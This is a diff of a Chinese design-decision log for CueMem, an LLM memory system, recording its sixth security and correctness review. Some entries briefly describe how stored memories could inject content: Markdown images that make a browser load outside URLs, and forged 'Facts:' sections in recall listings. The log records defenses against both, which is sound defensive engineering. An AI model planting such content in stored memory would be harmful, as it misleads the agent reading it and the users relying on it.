@@ -26,8 +26,8 @@
 | D-016 | 评测运行器：每题独立的内存存储 + 共享缓存；trace 计量；断点续跑；预算保护 | 已采纳 |
 | D-017 | 试跑后修订 Reader 提示词（v2），只在开发集上调整 | 已采纳 |
 | D-018 | 抽取模型用 qwen3.8-flash（与 deepseek-flash 抽样比对后确认） | 已采纳 |
-| D-019 | 事实对账：规则只管合并、否定与多值累积，取代一律由 LLM 确认；取代分"现实变了"与"认知变了" | 已采纳（实测后修订） |
-| D-020 | 巩固流水线：抽取无状态、并行；对账有状态、串行；记录时间取对话时间 | 已采纳 |
+| D-019 | 事实对账：规则只管合并、否定与多值累积，取代一律由 LLM 确认；取代分"现实变了"与"认知变了" | 已采纳（实测后修订；第六轮体检：折叠重音的严格键，D-073） |
+| D-020 | 巩固流水线：抽取无状态、并行；对账有状态、串行；记录时间取对话时间 | 已采纳（第六轮体检：新事实按说出的先后对账，D-073） |
 | D-021 | 遗忘 = 删除原始日志 + 重放派生记忆，并按归属清理缓存 | 已采纳（N12 之后修订：不再 VACUUM，D-068；巩固缓存只留重放原样用到的，D-069） |
 | D-022 | 核心记忆是事实表的物化视图，由规则生成，不用 LLM 改写 | 已采纳 |
 | D-023 | 用 B2F 隔离写入路径的贡献：检索算法不变，只换写入结构 | 已采纳 |
@@ -54,7 +54,7 @@
 | D-044 | Agent 用 qwen3.8-flash | 已采纳（N8） |
 | D-045 | 对话的写入：每轮追加、序号只增不减；进行中的会话不巩固；新任务取代旧的待办任务 | 已采纳（N8；第五轮体检：重建跳过留给调用方的 run、结束了的 run 不再打开，D-072） |
 | D-046 | 遗忘以整轮为单位并沿引用扩散；画像可引用；trace 一并清理 | 已采纳（N8） |
-| D-047 | 演示：虚构商店 + 生成的图片；界面英文；剧本可回放核对；MCP 只检索不回答 | 已采纳（N8） |
+| D-047 | 演示：虚构商店 + 生成的图片；界面英文；剧本可回放核对；MCP 只检索不回答 | 已采纳（N8；第六轮体检：界面不加载外站图片、/config 只接受同源，D-073） |
 | D-048 | 最终评测：测试集只用一次，方法与配置事先冻结；LoCoMo 后 7 段对话作测试集 | 已采纳（N9） |
 | D-049 | 换回答模型：小（qwen3.6-35b-a3b）、中（deepseek-flash、qwen3.8-flash）、大（deepseek-v4-pro），在分层子集上评测 | 已采纳（N9） |
 | D-050 | 结构化输出在请求超时时也换备用模型（与内容审核拒绝一样） | 已采纳（N9；第二轮体检：超时一次就换，D-069） |
@@ -63,23 +63,24 @@
 | D-053 | 对账提示分清"范围不同""现实变了""说错了"，并附上原话；不改流水线版本号 | 已采纳（N11） |
 | D-054 | Agent 的回答缓存按会话归属 | 已采纳（N11） |
 | D-055 | 外部基线 Mem0：同样的模型、同样的回答与判分，按它自己的流程写入与检索 | 已采纳（N11） |
-| D-056 | 部署：本地向量库被占用时明确报错；服务端建 payload 索引；迁移命令；可选访问令牌 | 已采纳（N11；第二轮体检：限定作用域的令牌，D-069；N12 之后修订：非本机地址必须有令牌，D-068；第四轮体检：令牌至少 16 个字符、Qdrant 的 API Key，D-071；第五轮体检：反向代理后面也要令牌、doctor --repair-vectors 与 --vectors、cuemem reindex，D-072） |
+| D-056 | 部署：本地向量库被占用时明确报错；服务端建 payload 索引；迁移命令；可选访问令牌 | 已采纳（N11；第二轮体检：限定作用域的令牌，D-069；N12 之后修订：非本机地址必须有令牌，D-068；第四轮体检：令牌至少 16 个字符、Qdrant 的 API Key，D-071；第五轮体检：反向代理后面也要令牌、doctor --repair-vectors 与 --vectors、cuemem reindex，D-072；第六轮体检：cuemem keys 与令牌文件的热加载、每个令牌同时处理的请求有上限，D-073） |
 | D-057 | 门控在真实流量上的检验：WildChat 里真实用户消息的第一句 | 已采纳（N11） |
 | D-058 | 控制器 v3：有图的空间里，只在问到图时才看图 | 已采纳（N11 之后） |
 | D-059 | 遗忘留下的空缺在重新抽取时标出来；挨着空缺的代词不套到别人身上 | 已采纳（N11 之后） |
-| D-060 | 换模型供应商：配置随包发布、数据目录、预设（openai、ollama）与 OpenAI 兼容的向量接口；Docker | 已采纳（N12） |
-| D-061 | Python SDK：照 Mem0 的接口形状，保留 CueMem 的语义（版本链、控制器、遗忘） | 已采纳（N12；第二轮体检：metadata、update、reset 与远程的 MemoryClient，D-069；第五轮体检：过期在召回、回答与画像里生效、valid_at 按时间段、本地检查参数、Mem0 保留的过滤名、按作用域等，D-072） |
-| D-062 | OpenAI 兼容的记忆代理：控制器先选，证据放在最后一句用户消息前面 | 已采纳（N12；第二轮体检：/v1/embeddings、/v1/responses 的子集，D-069；第四轮体检：可选的按令牌上限，D-071；第五轮体检：输出上限按模型自己的参数名写上、不给过期的记忆，D-072） |
+| D-060 | 换模型供应商：配置随包发布、数据目录、预设（openai、ollama）与 OpenAI 兼容的向量接口；Docker | 已采纳（N12；第六轮体检：记忆代理不转发没有 Key 的目录模型，D-073） |
+| D-061 | Python SDK：照 Mem0 的接口形状，保留 CueMem 的语义（版本链、控制器、遗忘） | 已采纳（N12；第二轮体检：metadata、update、reset 与远程的 MemoryClient，D-069；第五轮体检：过期在召回、回答与画像里生效、valid_at 按时间段、本地检查参数、Mem0 保留的过滤名、按作用域等，D-072；第六轮体检：context、幂等的 add、valid_at 对部分日期的结束与更正，D-073） |
+| D-062 | OpenAI 兼容的记忆代理：控制器先选，证据放在最后一句用户消息前面 | 已采纳（N12；第二轮体检：/v1/embeddings、/v1/responses 的子集，D-069；第四轮体检：可选的按令牌上限，D-071；第五轮体检：输出上限按模型自己的参数名写上、不给过期的记忆，D-072；第六轮体检：没有 Key 时回 503 model_not_available，不再不带 Key 转发，D-073） |
 | D-063 | 导出与导入只搬原始日志；遗忘可以预演 | 已采纳（N12；第二轮体检：导出格式 2，D-069；第五轮体检：只写了日志的会话导入后不抽取、原子地写导出文件，D-072） |
 | D-064 | 抽取的补充说明（custom instructions） | 已采纳（N12） |
 | D-065 | 同一协议下对比更多外部基线：Graphiti、LangMem、Cognee、A-MEM；只用 DeepSeek（pds）与只用通义（pq）两个协议 | 已采纳（N12；Holm 校正后 pds 下 L2 对 Mem0 不再显著，D-069） |
-| D-066 | 框架集成：OpenAI Agents SDK、LangGraph / LangChain、Claude 的 memory tool；召回证据收拢成一份 | 已采纳（N12） |
+| D-066 | 框架集成：OpenAI Agents SDK、LangGraph / LangChain、Claude 的 memory tool；召回证据收拢成一份 | 已采纳（N12；第六轮体检：召回清单逐行标出引用的文字，D-073） |
 | D-067 | LongMemEval 的会话 ID 泄漏：修复、量影响、照实披露 | 已采纳（N12） |
-| D-068 | 全面体检：七个视角找问题，离线复现、对抗式核实，修掉 24 处；评测请求与发表的数字不变 | 已采纳（N12 之后；留到以后的 17 条有 14 条由 D-069 做了；D-070、D-071、D-072 补记） |
-| D-069 | 第二轮体检：留到以后的 17 条做了 14 条，3 条仍留着；评测请求与发表的数字不变 | 已采纳（N12 之后；D-070、D-071、D-072 补记） |
+| D-068 | 全面体检：七个视角找问题，离线复现、对抗式核实，修掉 24 处；评测请求与发表的数字不变 | 已采纳（N12 之后；留到以后的 17 条有 14 条由 D-069 做了；D-070、D-071、D-072、D-073 补记） |
+| D-069 | 第二轮体检：留到以后的 17 条做了 14 条，3 条仍留着；评测请求与发表的数字不变 | 已采纳（N12 之后；D-070、D-071、D-072、D-073 补记） |
 | D-070 | 第三轮体检：七个视角从头再查一遍，核实为真的 22 处都修掉；评测请求与发表的数字不变 | 已采纳（N12 之后；D-071、D-072 补记） |
-| D-071 | 第四轮体检：仓库公开之后从六个视角再查，核实为真的 22 处；评测请求、图片请求与发表的数字不变 | 已采纳（N12 之后；D-072 补记） |
-| D-072 | 第五轮体检：合并到 main 之后从六个视角再查，核实为真的 22 处；评测请求、图片请求与发表的数字不变 | 已采纳（N12 之后） |
+| D-071 | 第四轮体检：仓库公开之后从六个视角再查，核实为真的 22 处；评测请求、图片请求与发表的数字不变 | 已采纳（N12 之后；D-072、D-073 补记） |
+| D-072 | 第五轮体检：合并到 main 之后从六个视角再查，核实为真的 22 处；评测请求、图片请求与发表的数字不变 | 已采纳（N12 之后；D-073 补记） |
+| D-073 | 第六轮体检：第五轮合并到 main 之后从六个视角再查，核实为真的 18 处；评测请求、图片请求与发表的数字不变 | 已采纳（N12 之后） |
 
 ## D-001 检索时机与深度由解耦的控制器决定，而不是由 LLM 自主决定
 
@@ -313,6 +314,7 @@
 - **第二轮体检之后（D-069）**：
   - **候选从索引里取**：`FactState` 随写入维护每个主语的当前事实与同序的 float32 向量矩阵、（主语，谓词，规范化宾语，否定）的索引与 `normalize_value` 的备忘，不再每条新事实都和全部事实比。候选、顺序、相似度与灰区提示都与以前逐位相同（414 个评测空间的只读重放核对过），9,600 条事实的重放约 396 秒 → 6.6 秒。
   - **SDK 的更正**：`update()` 记下的更正（原始层的 edit_of）由对账确定地取代原来那条（corrected，不问 LLM）：从更正里抽出的事实先看同谓词，再看陈述向量最近，再看抽取顺序；其余的事实照常对账。只靠 LLM 不够，登记过的多值谓词一律新增、不问 LLM。没有 edit_of 时不起作用，请求不变。
+- **第六轮体检之后（D-073）**：上面 D-068 那条（"拉丁字母（含带重音的）与汉字的键不变"）漏了一处：这些键把带重音的字母与全角的数字、字母整个删掉，`Müller` 与 `Möller`、`８０００円` 与 `６０００円` 的键相同，不同的值被当成重复合并，不同的人成了同一个实体。现在原来的键相同时再比一个折叠重音的键（`strict_key`），这样的值与名字不再合并，`Café` / `Cafe` 与 `Zoë` / `Zoé` 的比较结果与以前相同。已有的键、事实 ID 与实体 ID 不变，评测的键与请求不变。
 
 ## D-020 巩固流水线：抽取无状态、并行；对账有状态、串行；记录时间取对话时间
 
@@ -339,6 +341,7 @@
   - **后台线程**：`consolidation.background_workers` 个线程（缺省 4）共用一个去重的队列，最多 4 个空间同时巩固，同一空间仍一次一个、按会话顺序；同一空间重复提交合并成一次。抽取失败按空间与出错类别各记一次警告日志（`cuemem.write.consolidate`），`Memory.status()` 列出来。
   - **重放**清空派生层之后紧接着按这个空间原来的任务重新登记（`Consolidator.requeue`）：不抽取 `infer=False` 的会话，不重发内容审核拒绝的会话，失败的任务保留退避；向量库出错时空间保持原样，由后台线程重试。
   - 每次请求不再读出空间的全部会话（`has_sessions`、`enqueue_jobs` 等按点读取）；`background_workers` 不进巩固指纹。
+- **第六轮体检之后（D-073）**：同一个会话里，新事实按说出的先后对账（按来源发言最晚的时间稳定排序，没有时用会话开始的时间），不再按抽取模型列出的顺序。只有发言带着几个不同时间的会话会变，评测的会话都只有一个时间；一次多条消息的 add 抽出的事实时间相同，仍按抽取的顺序。
 
 ## D-021 遗忘 = 删除原始日志 + 重放派生记忆，并按归属清理缓存
 
@@ -839,6 +842,7 @@
 - **第二轮体检之后（D-069）**：MCP 的 remember、recall 与 forget 遇到模型或向量供应商出错时回英文的 ToolError（限流、余额不足、暂时不可用、超时、内容审核拒绝，知道时带 "in about N s"），以前只有 "Error executing tool"；forget 删完之后重建出错时照实说已经删了。MCP 仍只有 stdio、一个进程一个空间，限定作用域的访问令牌（D-069）管不到它。
 - **第三轮体检之后（D-070）**：除了 stdio，`cuemem serve` 在 `/mcp` 用 Streamable HTTP 提供同样的四个工具，令牌与限定作用域同 `/api`；`X-CueMem-User` / `X-CueMem-Agent` 选空间（`--no-mcp` 关掉）。
 - **第四轮体检之后（D-071）**：`/mcp` 的 `X-CueMem-User` 与 `X-CueMem-Agent` 认不是 ASCII 的 ID：`utf-8''<UTF-8 的百分号编码>`（RFC 8187，Node 的客户端包括 Claude Code 只能这样发）或原样的 UTF-8；以前原样的 UTF-8 写进乱码的空间。写错时 400。
+- **第六轮体检之后（D-073）**：界面把模型回答与画像里的 Markdown 图片写法显示成文字，画像按 HTML 转义，存下的记忆不能让访问者的浏览器去加载第三方的网址；图库里商品的图片不受影响。`/config` 与首页 `/` 拒绝带 `Origin` 的跨站请求，带 `Sec-Fetch-Site: cross-site` 的 `/logout` 回 403。
 
 ## D-048 最终评测：测试集只用一次，方法与配置事先冻结；LoCoMo 后 7 段对话作测试集
 
@@ -1018,6 +1022,7 @@
   - **反向代理后面**：监听本机地址、`CUEMEM_ALLOWED_HOSTS` 却列了不只指本机的主机名（或 `*`）时（README 公网部署的做法），也查令牌与 16 个字符的下限；以前"非本机地址"这一条让它不设令牌也能启动。只指本机的项（127.x、::1、localhost、*.localhost）不算；`--insecure-no-auth` / `--insecure-weak-token` 可以放过：有令牌时（例如加了 `--insecure-weak-token`）也打印明文 HTTP 的提示，加了 `--insecure-no-auth` 又没有令牌时改为打印写着这些主机名的不鉴权警告。
   - **本地向量库的恢复**：读不出的 `meta.json` 抛写明办法的 `VectorStoreOpenError`，`cuemem doctor --repair-vectors` 按 `collection/` 重写它（向量库被拿着时拒绝），`cuemem export` 与 `cuemem spaces` 只打开数据库，serve 拿着向量库时照样能用。`cuemem reindex` 按数据库补齐向量，`cuemem doctor --vectors` 列出哪些空间对不上；doctor 也打印数据目录的剩余空间。
   - **降级**：更新的 CueMem 写的库（`user_version` 大于 `SCHEMA_VERSION`，现在是 7）拒绝打开，不再悄悄降级。
+- **第六轮体检之后（D-073）**：`cuemem serve` 与 `cuemem proxy` 运行期间重新读入 `CUEMEM_API_KEYS_FILE` 的文件（最多每秒一次；文件不在了、写错了或清空了时留着原来的令牌），`cuemem keys add|list|revoke` 在这个文件里生成、列出与吊销限定作用域的令牌，加、吊销令牌都不用重启；管理令牌与写在 `CUEMEM_API_KEYS` 里的仍只在启动时读。每个限定作用域的令牌同时在处理的请求最多 `CUEMEM_MAX_CONCURRENT_PER_KEY`（默认 8）个，或者它自己写的 `max_concurrent`（超过时 429）；`POST /api/v1/wait` 不再占着服务器的线程。
 
 ## D-057 门控在真实流量上的检验：WildChat 里真实用户消息的第一句
 
@@ -1097,6 +1102,7 @@
   - **Docker**：缺省的 `EXTRAS` 是 `--extra ui --extra local`，`--build-arg EXTRAS=` 构建只有接口与代理的镜像（不带 Gradio、fastembed 与 onnxruntime）。
   - **启动**：包的 `__init__` 与命令行按需导入，`cuemem --help` 3.8 → 0.42 秒，`import cuemem.sdk` 2.7 → 0.30 秒。
 - **第四轮体检之后（D-071）**：CueMem 没有发布到 PyPI，源码仓库之外每个安装提示都是 `pip install "cuemem[<extra>] @ git+https://github.com/FlickYan/cuemem"`（`cuemem.config.INSTALL_URL`），Docker 镜像里是用 `--build-arg EXTRAS=…` 重新构建；配置写错（预设名不对、`CUEMEM_*` 的值不合法）只打印一行"错误：配置有误：…"并以 1 退出，不再打印调用栈；命令行收紧 umask，数据目录、`.env` 与它写的每个文件都只给本人；`.env.example` 的注释单独成行，因为 `docker run --env-file` 把行尾注释算进值里。
+- **第六轮体检之后（D-073）**：预设叠在默认的模型目录上，所以 `--preset openai`、`deepseek` 或 `ollama` 下默认的通义与 DeepSeek 别名仍在目录里；记忆代理对供应商 Key 没设的这些别名回 503 `model_not_available`，`GET /v1/models` 也不列它们（以前不带 Key 照样转发）。`--preset ollama` 不要 Key 的是它自己的模型，不是目录里的每个模型。`--preset` 的帮助列出全部四个预设（openai、ollama、deepseek、qwen）；换预设要用新的数据目录，因为数据目录记着它的向量模型。
 
 ## D-061 Python SDK：照 Mem0 的接口形状，保留 CueMem 的语义
 
@@ -1135,6 +1141,7 @@
   - 一句发言都没删、事实却还在时，`delete` 回 "Nothing deleted" 与重建的提示。
 - **第四轮体检之后（D-071）**："进程崩溃时还开着的 run，下一个进程第一次碰到这个用户时交给抽取"现在只对本地的 SDK 与命令行成立，而且不包括 run 本身：之前的进程留下的 run 上 `add(run_id=X)` 接着写（与 `open_run(X)` 相同），`cuemem serve` 与 `cuemem proxy` 下启动后第一个闲置期里别的请求不接手它，之后才交给抽取。普通脚本应该关掉 `Memory`（`m.close()` 或 `with Memory(...) as m:`），否则解释器退出时打印一段无害的 Qdrant 调用栈（退出时自动关掉的做法没有采用）。
 - **第五轮体检之后（D-072）**：本地的 `search` 与 `answer` 与 `/api/v1` 一样检查 `mode`、`router`、`min_level` 与 `lam`（同一句话的 ValueError；`answer` 只接受 `auto`、`l0`、`l1`、`l2`、`agent` 与 `hatch`）；`get_all(valid_at=)` 接受 `YYYY`、`YYYY-MM` 或 `YYYY-MM-DD`（或 date、datetime），年或月指那段时间里任何时候成立的事实，别的写法报错；filters 里 Mem0 保留的 `created_at`、`updated_at` 与 `categories` 也对记忆自己的字段；`wait(*, user_id, agent_id, timeout)` 可以只等一个用户的抽取、可以超时；`answer()` 与别的产品入口不再给出过期的记忆；`MemoryAPIError` 多了 `sent` 与客户端一侧的代码（`unreachable`、`timeout`、`disconnected`、`transport`）。
+- **第六轮体检之后（D-073）**：新增、要显式用的：`context(query, ...)` 返回记忆代理注入的那段证据块，直接放进提示词（也有 `POST /api/v1/context`）；`add(idempotency_key=)`（HTTP 上是 `Idempotency-Key` 头）让 24 小时内重发的 add 只写一次，返回 status `duplicate`，那次的发言已经遗忘时是 `forgotten`；同一个键用于不同的请求时抛 `IdempotencyConflictError`（409）。`get_all(valid_at=)` 查一年或一个月时，结束时间只知道年或月、落在这段时间里的值也给出；更正了的值从被更正那一版的开始算起。
 
 ## D-062 OpenAI 兼容的记忆代理：控制器先选，证据放在最后一句用户消息前面
 
@@ -1176,6 +1183,7 @@
 - **第五轮体检之后（D-072）**：
   - **输出上限**：写了 `max_output_tokens` 的令牌，请求只给了另一个名字时，也按模型的 `max_tokens_param` 写上上限（以前只给 `max_completion_tokens` 时，到 DeepSeek、通义的模型那里没有 `max_tokens`）。
   - **过期的记忆**不再作为证据（或画像的行）注入；空间里没有会过期的行时请求逐字节不变。
+- **第六轮体检之后（D-073）**：服务端没设供应商 Key 的目录模型（例如 `--preset openai` 下没有 `DASHSCOPE_API_KEY` 时默认的 `qwen3.8-flash`）在检索、开会话之前回 503 `model_not_available`（type `server_error`，`x-should-retry: false`），不再连同用户的话与想起的记忆、不带 `Authorization` 头转发出去；`GET /v1/models` 与 `reject` 的 400 只列服务端有 Key 的模型。限定作用域的令牌同时处理的请求也有上限（D-056）。Key 都设了时转发的字节不变。
 
 ## D-063 导出与导入只搬原始日志；遗忘可以预演
 
@@ -1353,6 +1361,7 @@
   - 集成在进程里直接用记忆系统，要传本地的 `Memory`；远程的 `MemoryClient` 不能代替它。
 - **第三轮体检之后（D-070）**：把 `MemoryClient` 传给任何一个集成都在构造时抛 TypeError（以前之后才 AttributeError），`claude.with_recall` 抛出而不是只警告。
 - **第四轮体检之后（D-071）**：记忆代理现在丢掉照等上游回答期间被遗忘的记忆写的回答；各集成同样是"召回 → 模型 → 写回"，没有这项检查（没有复现过），仍是局限。
+- **第六轮体检之后（D-073）**：MCP 以及 LangGraph、OpenAI Agents 的 recall 工具的召回清单，存下的对话片段与画像每一行都以 `| ` 开头，多行的事实陈述用 ` / ` 连成一行，结尾是 `End of recalled memories.`，存下的消息不能在 forget 工具旁边伪造一个 `Facts:` 段落；自动召回的证据块不变。anthropic 2.3 的 `tool_runner` 把对话（连同证据块）放在服务端保存的线程里，CueMem 的遗忘够不着；`thread=False`（anthropic 2.3 起）改为每次发送完整的历史，框架集成的文档现在写明了。
 
 ## D-067 LongMemEval 的会话 ID 泄漏：修复、量影响、照实披露
 
@@ -1526,9 +1535,12 @@
   - **第 3 组（"重启后接着做"）**：`cuemem serve` 正常停止或重启时 `/api/v1` 的 run 跨过重启，用同一个 run_id 的下一次 add 重新打开它（`MemorySystem.resume_left_open`）。`cuemem serve` 与 `cuemem proxy` 在启动一个闲置期（`--idle-minutes`，默认 30）之后，把崩溃或停止留下的其余会话（v1 的 run、界面与 `/api` 的会话、记忆代理的会话）交给抽取一次（`MemorySystem.adopt_left_open`，经 `api.app._adopt_after`），在那之前别的请求不接手它们。以前要等有人再写这个空间才接手，没人回来就一直不抽取。不在启动时接手：那样部署之后接着写的 run 每次 add 都整段再抽取、把整个空间重放一遍（3 次 add：以前抽取 4 次、重放 3 次，现在 1 次与 0 次）。本地的 SDK 与命令行仍在第一次碰到时接手。
   - **第 4 组的缺省值变化**：加了 `--insecure-no-auth` 又监听非本机地址时也查 Host。以前这种情况不查，因为理由假定了有令牌。接受任何 IP 地址、localhost、监听的主机名与 `CUEMEM_ALLOWED_HOSTS`，别的主机名 400。界面的登录（`/login`）也在同源检查之内，非本机地址的令牌至少 16 个字符。
   - **第 7 组**：一行的错误没有改变退出码（调用栈也是退出码 1），所以 compose 的 `restart: unless-stopped` 对配置错误照样反复重启。重启策略不变（崩溃与重启机器之后能自己起来）；README、`.env.example` 与 `docker-compose.yml` 现在写明怎么看原因（`docker compose ps` 显示 Restarting，`docker compose logs cuemem` 里是一行原因），每个命令对配置写错也只打印一行。
-  - **仍有的局限**："遗忘还清不到 L2 规划的子查询与 Agent 检索时的查询向量，图片向量的缓存也不清"已经修好。仍留着：`cuemem search --image` 的查询图片向量（按查询图片的 sha256）除非同一张图存下了，否则不删；在线写入回滚了的图片的缓存条目留着没人管；Gradio 的临时副本最多比遗忘晚约 2 小时删。"记忆代理在上游回答之后的写回不在读写门里"对记忆代理已修好（照期间被遗忘的记忆写的回答丢掉，用户的话照写）；`integrations/openai_agents.py`、`langgraph.py` 与 `claude.py` 里仍是同样的"召回 → 模型 → 写回"，没有复现过。"B6a 的看图路径仍没有离线的请求快照"已经补上：`tests/test_store.py` 在 768 与 512 像素上钉住全部 24 张演示图与 15 张不经重采样做出来的图的 `image_data_url` 摘要（手机形状的高图，以及 L、LA、RGBA、P、1、I;16 与 CMYK 各种模式，PNG、JPEG、GIF、TIFF、BMP 与 WEBP）。
+  - **仍有的局限**："遗忘还清不到 L2 规划的子查询与 Agent 检索时的查询向量，图片向量的缓存也不清"已经修好。仍留着：`cuemem search-image` 的查询图片向量（按查询图片的 sha256）除非同一张图存下了，否则不删；在线写入回滚了的图片的缓存条目留着没人管；Gradio 的临时副本最多比遗忘晚约 2 小时删。"记忆代理在上游回答之后的写回不在读写门里"对记忆代理已修好（照期间被遗忘的记忆写的回答丢掉，用户的话照写）；`integrations/openai_agents.py`、`langgraph.py` 与 `claude.py` 里仍是同样的"召回 → 模型 → 写回"，没有复现过。"B6a 的看图路径仍没有离线的请求快照"已经补上：`tests/test_store.py` 在 768 与 512 像素上钉住全部 24 张演示图与 15 张不经重采样做出来的图的 `image_data_url` 摘要（手机形状的高图，以及 L、LA、RGBA、P、1、I;16 与 CMYK 各种模式，PNG、JPEG、GIF、TIFF、BMP 与 WEBP）。
 - **第五轮体检之后（D-072）**：
   - **第 3 组（"重启后接着做"）**：推迟接手也管重建：显式的 `consolidate(rebuild=True)`，或部署改了指纹之后的自动重建，跳过留给调用方接着写的 run（`MemorySystem._held`），以前会把它们半段抽取。`open_run` 与 `end_run` 去掉交接的记录（`MemorySystem._handed_over`），所以"下一次 add 重新打开它"只对交接过、调用方既没重新打开也没结束的 run 成立；`end_run` 之后同一个 run_id 的 add 是普通的会话（以前 `add(wait=True)` 报 "still open"）。
+- **第六轮体检之后（D-073）**：
+  - **第 4 组**：转义 `<memory` 的正则遇到 `<` 后面一长串空白时回溯 O(n²)，一直持有 GIL（一条 5 万个空格的记忆要 154 秒）；现在用占有量词，匹配结果相同。召回清单里引用的文字逐行以 `| ` 开头，结尾一行固定，`LISTING_NOTE` 多一句。
+  - **第 5 组（其他文字）**："拉丁字母（含带重音的）与汉字的键不变"：这些键把带重音的字母与全角的数字、字母整个删掉。现在它们相同时再比一个折叠重音的键，`Müller` / `Möller` 与 `８０００円` / `６０００円` 不再合并；已有的键与事实 ID 不变。
 
 ## D-069 第二轮体检：留到以后的 17 条做了 14 条，3 条仍留着；评测请求与发表的数字不变
 
@@ -1657,6 +1669,9 @@
   - **第 5 组（过期）**："过期在 SDK 读取时生效……`answer()`、记忆代理、MCP……仍看得到过期的记忆"不再成立：`answer()`、记忆代理、MCP 与 HTTP 的 recall、`/api` 的画像、界面的画像栏、`cuemem serve` 的对话 Agent 与 Claude、OpenAI Agents、LangGraph 的集成也不给出它们（`MemorySystem.retrieve` / `ask` 的 `hide_expired=True`；`cuemem.expiry`）。浏览原始数据的事实列表（`/api/spaces/{space}/facts`、界面）、实体图、图库、`cuemem ask` 与 `cuemem inspect` 仍给出它们。仍不改写 valid_to，评测保持 `hide_expired=False`。
   - **第 5 组（`valid_at`）**：`"2025-06"` 以前按字符串比较、什么都查不到；现在年或月指那段时间里任何时候成立的事实，别的写法报 ValueError。
   - **留到以后的第 5 条**："过期只对 SDK 的 search、get_all 与画像生效"已经解决，只剩上面浏览原始数据的接口与命令行。
+- **第六轮体检之后（D-073）**：
+  - **备选与取舍**："在线写入用幂等键"以要显式用的形式采纳了：`add(idempotency_key=)` 与 `POST /api/v1/memories` 的 `Idempotency-Key` 头。全有或全无的写入照旧管失败；这个键管的是响应丢了（D-072 的 `timeout` 与 `disconnected`），那时调用方没有办法安全地重发，`get_all` 也看不到排着队的 add。键按用户（空间）记 24 小时，只存 sha256，删整个用户的 `delete_all` 与 `reset` 连它一起删掉。
+  - **第 6 组**：运行中的 serve 与 proxy 会重新读入 `CUEMEM_API_KEYS_FILE` 里的限定作用域的令牌，`cuemem keys add|list|revoke` 修改这个文件。
 
 ## D-070 第三轮体检：七个视角从头再查一遍，核实为真的 22 处都修掉；评测请求与发表的数字不变
 
@@ -1795,7 +1810,7 @@
      - **遗忘漏掉的查询向量**（P20）：遗忘、`delete_all` / `reset` 与 trace 的过期现在还删 L2 规划的子查询、检查证据够不够之后追加的查询（检查的模型看过记忆，会复述被删的内容，例如 "bank card PIN 4321 Commerzbank"）、Agent 自己的检索（ToolReader，以及 `Agent.chat` 的 `memory_search`，现在在对话的 trace 里记成一个 `agent` 事件 `{searches, queries}`）与（复审补上）导购演示的商品检索（`search_products`；`searches` 仍只数记忆的检索）的查询向量。这些文字取自 trace 里本来就记着的（`trace_queries`：`plan.sub_queries`、`check.queries`、`agent.queries`），以前写下的 trace 也覆盖。用 DashScope 多模态向量器时，这些查询的多模态文字向量（`mm|…|text|…`）一起删；遗忘还在没有媒体记录再用这个 sha256 时删掉被删图片的向量（`mm|…|image|…`），与删原图同一个规则（`DashScopeMultimodalEmbedder.purge`；算进 `ForgetReport.embed_cache_purged`）。
      - **记忆代理写回的竞争**（P20）：记忆代理在检索之前记下这个空间删过几次；写回之前发生过遗忘时（例如等上游回答期间别的调用方删除，流式时更久），照注入的证据写的回答不写进日志，有 trace 时记一个 `proxy_write_dropped`（reason `forgotten`，part `answer`）。用户的话照写。
      - **缺省值的变化**：进行中的对话会话在任何遗忘之后的下一轮同步；serve 与 proxy 在启动一个闲置期之后交接之前的进程留下的会话（那时可能发出抽取请求），所以崩溃留下的界面、`/api` 与记忆代理的会话在启动加一个闲置期时抽取，而不是在重启之后用户第一次请求时；之前的进程留下的 run 上 `add(run_id=X)` 重新打开它，而不是接手；遗忘在提交之后不再因 trace 或缓存的清理抛出，重写不了的某天的 trace 文件整个删掉；遗忘与过期删更多的查询向量；记忆代理丢掉照期间被遗忘的记忆写的回答。新的内部接口：`MemorySystem.forget_epoch`、`resume_left_open`、`adopt_left_open` 与 `defer_adoption`，`api.app._adopt_after`，`TraceSink.remove(..., dropped=, left=)`，`cuemem.core.trace.trace_queries`，`DashScopeMultimodalEmbedder.purge`，`ToolContext.queries`。没有新的命令行参数、环境变量或接口。
-     - **留着的**：之前的进程已经因闲置结束或交给抽取的 run（两者都只记在那个进程的内存里），重启之后算普通会话；本进程交接过、超过 10,000 个之后不再记得的 run 也一样：之后每次 add 都整段再抽取、重放这个用户的整个空间（D-045），每次重放期间这个用户的事实在 search 与 `get_all` 里暂时没有；长时间停顿的客户端应该在自然的段落处 `end_run`、再开一个新的 run。可选的 `cuemem serve --run-idle-minutes` 要主人决定。`cuemem search --image` 的查询图片向量，除非同一张图存下了，否则不删；在线写入回滚了的图片的缓存条目留着没人管；Gradio 的临时副本最多比遗忘晚约 2 小时删（现在放在只给本人的目录里，第 4 组）。记忆代理修好的"召回 → 模型 → 写回"在三个集成里仍是同样的形状，没有复现过。
+     - **留着的**：之前的进程已经因闲置结束或交给抽取的 run（两者都只记在那个进程的内存里），重启之后算普通会话；本进程交接过、超过 10,000 个之后不再记得的 run 也一样：之后每次 add 都整段再抽取、重放这个用户的整个空间（D-045），每次重放期间这个用户的事实在 search 与 `get_all` 里暂时没有；长时间停顿的客户端应该在自然的段落处 `end_run`、再开一个新的 run。可选的 `cuemem serve --run-idle-minutes` 要主人决定。`cuemem search-image` 的查询图片向量，除非同一张图存下了，否则不删；在线写入回滚了的图片的缓存条目留着没人管；Gradio 的临时副本最多比遗忘晚约 2 小时删（现在放在只给本人的目录里，第 4 组）。记忆代理修好的"召回 → 模型 → 写回"在三个集成里仍是同样的形状，没有复现过。
      - **接受的代价**：源码仓库里产品与评测共用 `data/cache/embed.sqlite`，遗忘或打开了的过期可能删掉评测里逐字相同的子查询或多模态查询向量，重放时要重新算（要联网），与 `prune_traces` 对提问的做法相同。
      - **评测**：评测从不遗忘、不开对话会话与 run、不启动后台线程、不经 serve 与记忆代理，用 `tracer=None`；新的 `agent` 事件只进 trace，`n8_context` 只按 `llm` 与 `embedding` 事件统计。遗忘的次数只在进程的内存里。
   4. **文件权限**（P14；修订 D-056、D-060、D-068 第 2 组）：
@@ -1848,7 +1863,7 @@
     4. P15：`authors` 与 `CITATION.cff` 的署名、给贡献者的模板、`v0.1.0` 标签与仓库的简介设置；
     5. P16：之前的进程因闲置结束或交给抽取的 run（第 3 组）；`--run-idle-minutes`；
     6. P17：重新渲染、上传视频，更新链接；
-    7. P20 与 D-068：`cuemem search --image` 的查询图片向量、回滚了的图片写入留下的缓存条目、Gradio 的临时副本最多约 2 小时，以及三个集成里的"召回 → 模型 → 写回"；
